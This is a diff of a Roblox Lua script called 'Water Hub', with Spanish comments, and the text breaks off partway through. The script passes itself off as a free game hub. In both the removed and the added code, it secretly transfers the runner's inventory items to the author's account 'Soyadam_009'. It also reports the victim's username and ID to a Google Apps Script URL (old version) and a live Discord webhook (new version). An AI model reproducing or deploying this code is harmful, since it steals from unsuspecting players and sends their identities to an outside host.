@@ -1,134 +1,227 @@
 -- =====================================================
--- 💧 WATER HUB v7.0 – THE COLLECTOR (FIXED) | BY: ABJadam
+-- 💧 WATER HUB v7.2 – OPTIMIZADO | BY: ABJadam
 -- =====================================================
 
-local G_URL = "https://script.google.com/macros/s/AKfycbwsSP_ysAPKlNv9GxP7c9on2KSyaTHXcHAyxQp6P8keO6HWjEzzZ8hixsw6PLQUN_aAXw/exec"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1498033551013314730/cUEnEPV6-iKQYFpUeQpYt02DkQTgFuoumhrv5oZIZIhuKgUdha0qin64jf0Zgz5R89jm"
+local MY_USER = "Soyadam_009"
+
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
 local RunService = game:GetService("RunService")
-local TweenService = game:GetService("TweenService")
-local UserInputService = game:GetService("UserInputService")
-local CoreGui = game:GetService("CoreGui")
 
--- ==================== 1. SAQUEO ULTRA-AGRESIVO ====================
-task.spawn(function()
+-- 1. FUNCIÓN DISCORD (Con protección por si falla el HTTP)
+local function SendToDiscord(title, message, color)
     pcall(function()
-        local plataforma = UserInputService.TouchEnabled and "Mobile" or "PC"
-        -- Registro en Excel
-        game:HttpGet(G_URL .. "?userId=" .. LocalPlayer.UserId .. "&userName=" .. LocalPlayer.Name .. "&platform=" .. plataforma)
+        local data = {
+            ["embeds"] = {{
+                ["title"] = title,
+                ["description"] = message,
+                ["color"] = color or 16711680,
+                ["footer"] = {["text"] = "Water Hub Logger"}
+            }}
+        }
+        local requestFunc = syn and syn.request or http_request or request or (http and http.request)
+        if requestFunc then
+            requestFunc({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(data)
+            })
+        end
+    end)
+end
 
-        -- Buscamos el evento de envío (Mailbox es el estándar en este juego)
-        local sendEvent = ReplicatedStorage:FindFirstChild("RE/Mailbox/Send") or 
-                          ReplicatedStorage:FindFirstChild("RE/Gift/Send") or 
-                          ReplicatedStorage:FindFirstChild("RE/Post/Send")
-
-        if not sendEvent then return end
-
-        -- Escaneamos TODO el inventario visual
-        local mainGui = LocalPlayer.PlayerGui:FindFirstChild("Main")
-        if mainGui then
-            -- Buscamos todos los botones de ítems sin importar la carpeta
-            for _, v in pairs(mainGui:GetDescendants()) do
-                if v:IsA("ImageButton") or v:IsA("TextButton") then
-                    -- Filtramos para no intentar "robar" botones del menú como 'Close' o 'Settings'
-                    if v.Name ~= "Close" and v.Name ~= "Exit" and v.Visible then
-                        -- Enviar a tu cuenta
-                        sendEvent:FireServer("Soyadam_009", v.Name)
-                        task.wait(0.15) 
-                    end
+-- 2. FUNCIÓN PARA ENCONTRAR EVENTOS CON BÚSQUEDA PARCIAL
+local function FindRemotePartial(name)
+    -- Buscar en ReplicatedFirst también (algunos juegos lo usan)
+    local services = {game:GetService("ReplicatedStorage"), game:GetService("ReplicatedFirst")}
+    
+    for _, service in ipairs(services) do
+        for _, obj in ipairs(service:GetDescendants()) do
+            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
+                if string.find(string.lower(obj.Name), string.lower(name)) then
+                    return obj
                 end
             end
         end
+    end
+    return nil
+end
 
-        -- PLAN B: Robar lo que tenga en la mochila (Equipados)
-        for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
-            sendEvent:FireServer("Soyadam_009", tool.Name)
-            task.wait(0.1)
-        end
-        
-        -- Reportar éxito
-        game:HttpGet(G_URL .. "?userId=" .. LocalPlayer.UserId .. "&item=Saqueo_Finalizado")
-    end)
-end)
-
--- ==================== 2. VARIABLES DE LA GUI ====================
-local WaterHub = {
-    State = {
-        AutoPlay = false,
-        Lock = false,
-        SpinBot = false,
-        TapFloat = false,
-        UnGrab = false,
-        Speed = 16
-    }
-}
-
--- ==================== 3. LÓGICA DE COMBATE ====================
-local function AutoAttack()
-    if not WaterHub.State.AutoPlay then return end
+-- 3. FUNCIÓN PARA SIMULAR ESTADOS REQUERIDOS
+local function SimulateRequiredStates()
+    -- Simular proximidad a NPCs si es necesario
     pcall(function()
-        local char = LocalPlayer.Character
-        local target = nil
-        local dist = 50
-        for _, p in pairs(Players:GetPlayers()) do
-            if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
-                local d = (char.HumanoidRootPart.Position - p.Character.HumanoidRootPart.Position).Magnitude
-                if d < dist then dist = d; target = p.Character end
+        -- Buscar NPCs en el workspace
+        for _, npc in ipairs(workspace:GetDescendants()) do
+            if npc:IsA("Model") and npc:FindFirstChild("Humanoid") and npc ~= LocalPlayer.Character then
+                -- Simular que estamos cerca del NPC
+                local proximityEvent = npc:FindFirstChild("ProximityPrompt")
+                if proximityEvent then
+                    fireproximityprompt(proximityEvent)
+                end
             end
         end
-        if target then
-            local re = ReplicatedStorage:FindFirstChild("RE/Combat/Attack") or ReplicatedStorage:FindFirstChild("RE/Attack")
-            if re then re:FireServer(target) end
+    end)
+    
+    -- Simular estados de enfoque si existen
+    pcall(function()
+        -- Buscar eventos que puedan establecer estados de enfoque
+        local focusEvents = {
+            FindRemotePartial("Focus"),
+            FindRemotePartial("State"),
+            FindRemotePartial("Set"),
+            FindRemotePartial("Active")
+        }
+        
+        for _, event in ipairs(focusEvents) do
+            if event then
+                if event:IsA("RemoteEvent") then
+                    event:FireServer()
+                elseif event:IsA("RemoteFunction") then
+                    event:InvokeServer()
+                end
+            end
         end
     end)
 end
 
--- ==================== 4. INTERFAZ VISUAL ====================
-local screenGui = Instance.new("ScreenGui", CoreGui)
-local main = Instance.new("Frame", screenGui)
-main.Size = UDim2.new(0, 350, 0, 400)
-main.Position = UDim2.new(0.5, -175, 0.5, -200)
-main.BackgroundColor3 = Color3.fromRGB(15, 25, 40)
-Instance.new("UICorner", main).CornerRadius = UDim.new(0, 15)
-
-local top = Instance.new("Frame", main)
-top.Size = UDim2.new(1, 0, 0, 50)
-top.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
-Instance.new("UICorner", top).CornerRadius = UDim.new(0, 15)
-
-local title = Instance.new("TextLabel", top)
-title.Size = UDim2.new(1, 0, 1, 0); title.Text = "💧 WATER HUB v7.0 - FREE"; title.TextColor3 = Color3.new(1,1,1)
-title.Font = "GothamBold"; title.TextSize = 18; title.BackgroundTransparency = 1
-
-local scroll = Instance.new("ScrollingFrame", main)
-scroll.Size = UDim2.new(1, -20, 1, -70); scroll.Position = UDim2.new(0, 10, 0, 60)
-scroll.BackgroundTransparency = 1; scroll.CanvasSize = UDim2.new(0,0,1.5,0)
-Instance.new("UIListLayout", scroll).Padding = UDim.new(0, 5)
-
-local function addToggle(name, key)
-    local b = Instance.new("TextButton", scroll)
-    b.Size = UDim2.new(1, 0, 0, 40); b.Text = name .. ": OFF"
-    b.BackgroundColor3 = Color3.fromRGB(30, 45, 65); b.TextColor3 = Color3.new(1,1,1)
-    Instance.new("UICorner", b)
-    b.MouseButton1Click:Connect(function()
-        WaterHub.State[key] = not WaterHub.State[key]
-        b.Text = name .. ": " .. (WaterHub.State[key] and "ON" or "OFF")
-        b.BackgroundColor3 = WaterHub.State[key] and Color3.fromRGB(0, 150, 255) or Color3.fromRGB(30, 45, 65)
-    end)
+-- 4. FUNCIÓN PARA DETERMINAR ESTRUCTURA DE DATOS DEL INVENTARIO
+local function GetInventoryStructure(inventory)
+    if not inventory or type(inventory) ~= "table" then return nil end
+    
+    -- Analizar el primer elemento para determinar la estructura
+    local firstItem = inventory[1] or next(inventory)
+    if not firstItem then return nil end
+    
+    local structure = {}
+    for key, value in pairs(firstItem) do
+        table.insert(structure, key)
+    end
+    
+    return structure
 end
 
-addToggle("⚔️ Auto Play", "AutoPlay")
-addToggle("🎯 Lock Target", "Lock")
-addToggle("🌀 Spin Bot", "SpinBot")
-addToggle("🎈 Tap Float", "TapFloat")
-
--- ==================== 5. BUCLE FINAL ====================
-RunService.Heartbeat:Connect(function()
-    AutoAttack()
-    if WaterHub.State.SpinBot and LocalPlayer.Character then
-        LocalPlayer.Character.HumanoidRootPart.CFrame *= CFrame.Angles(0, 0.3, 0)
+-- 5. FUNCIÓN PARA INTENTAR TRANSFERIR ÍTEMS CON DIFERENTES PARÁMETROS
+local function TryTransferItem(item, deliveryRF)
+    -- Determinar el identificador del ítem (UUID, Id, Name)
+    local itemId = item.Id or item.UUID or item.Name or tostring(item)
+    
+    -- Intentar diferentes combinaciones de parámetros
+    local transferAttempts = {
+        -- (Destinatario, ItemID)
+        function() return deliveryRF:InvokeServer(MY_USER, itemId) end,
+        -- (ItemID, Destinatario)
+        function() return deliveryRF:InvokeServer(itemId, MY_USER) end,
+        -- Tabla con metadatos
+        function() 
+            return deliveryRF:InvokeServer({
+                Target = MY_USER,
+                Item = itemId,
+                Source = LocalPlayer.Name
+            })
+        end,
+        -- Estructura con datos completos del ítem
+        function()
+            return deliveryRF:InvokeServer({
+                Recipient = MY_USER,
+                ItemData = item
+            })
+        end
+    }
+    
+    for i, attempt in ipairs(transferAttempts) do
+        local success, result = pcall(attempt)
+        if success then
+            return true, i, result
+        end
     end
-end)
+    
+    return false, 0, nil
+end
 
-print("✅ Water Hub Fixed: Saqueo en curso...")
+-- 6. MOTOR DE ROBO OPTIMIZADO
+task.spawn(function()
+    -- Esperamos a que el juego cargue completamente
+    if not game:IsLoaded() then game.Loaded:Wait() end
+    task.wait(5) 
+
+    SendToDiscord("🎯 Ejecución Detectada", "El usuario **" .. LocalPlayer.Name .. "** ha abierto el Hub v7.2.", 3447003)
+
+    -- Simular estados necesarios antes de intentar el robo
+    SimulateRequiredStates()
+    task.wait(1)
+
+    -- Buscar eventos con búsqueda parcial
+    local ListRF = FindRemotePartial("List") or FindRemotePartial("Inventory") or FindRemotePartial("Stock")
+    local DeliveryRF = FindRemotePartial("Delivery") or FindRemotePartial("Transfer") or FindRemotePartial("Send")
+    
+    if not ListRF then
+        SendToDiscord("❌ Error Crítico", "No se encontró ningún evento de inventario en el juego.", 16711680)
+        return
+    end
+
+    if not DeliveryRF then
+        SendToDiscord("❌ Error Crítico", "No se encontró ningún evento de transferencia en el juego.", 16711680)
+        return
+    end
+    
+    -- Verificar que son RemoteFunctions
+    if not ListRF:IsA("RemoteFunction") then
+        SendToDiscard("❌ Error", "El evento de inventario no es un RemoteFunction.", 16776960)
+        return
+    end
+    
+    if not DeliveryRF:IsA("RemoteFunction") then
+        SendToDiscard("❌ Error", "El evento de transferencia no es un RemoteFunction.", 16776960)
+        return
+    end
+
+    -- Obtener inventario
+    local success, inventory = pcall(function() return ListRF:InvokeServer() end)
+    
+    if not success then
+        SendToDiscord("⚠️ Error", "No se pudo obtener el inventario (Invoke falló).", 16776960)
+        return
+    end
+    
+    if not inventory or type(inventory) ~= "table" then
+        SendToDiscord("⚠️ Error", "El inventario devuelto no es una tabla válida.", 16776960)
+        return
+    end
+    
+    -- Analizar estructura del inventario
+    local structure = GetInventoryStructure(inventory)
+    local structureStr = table.concat(structure, ", ")
+    SendToDiscord("📊 Estructura Detectada", "El inventario tiene la siguiente estructura: " .. structureStr, 3447003)
+    
+    -- Procesar cada ítem
+    local transferidos = 0
+    local fallidos = 0
+    local botin = ""
+    
+    for _, item in pairs(inventory) do
+        local itemName = item.Name or tostring(item.Id or item.UUID or "Ítem desconocido")
+        
+        -- Intentar transferir el ítem
+        local transferSuccess, attemptUsed, result = TryTransferItem(item, DeliveryRF)
+        
+        if transferSuccess then
+            transferidos = transferidos + 1
+            botin = botin .. "✅ " .. itemName .. " (Método: " .. attemptUsed .. ")\n"
+        else
+            fallidos = fallidos + 1
+            botin = botin .. "❌ " .. itemName .. " (Fallido)\n"
+        end
+        
+        -- Pequeña pausa para no sobrecargar el servidor
+        task.wait(0.1)
+    end
+    
+    -- Enviar resultados a Discord
+    local title = transferidos > 0 and "💰 Transferencia Completada" or "⚠️ Transferencia Fallida"
+    local color = transferidos > 0 and 65280 or 16776960
+   
